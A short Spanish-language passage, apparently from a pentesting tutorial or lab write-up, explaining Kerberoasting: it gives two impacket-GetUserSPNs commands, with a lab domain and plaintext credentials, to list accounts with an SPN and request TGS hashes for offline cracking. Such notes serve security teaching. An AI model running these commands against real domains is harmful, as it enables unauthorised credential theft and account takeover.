Si existen usuarios con el SPN activo los mostrara por aquí y no sera necesario que el usuario que utilicemos para la enumeración tenga privilegios solo credenciales validas.
```
impacket-GetUserSPNs savicorp.local/ramblux:P@ssword2

```

Para solicitar un ticket y asi obtener un hash TGS del usuario que tiene el SPN activo  para poder explotarlo
```
impacket-GetUserSPNs savicorp.local/ramblux:P@ssword2 -request

```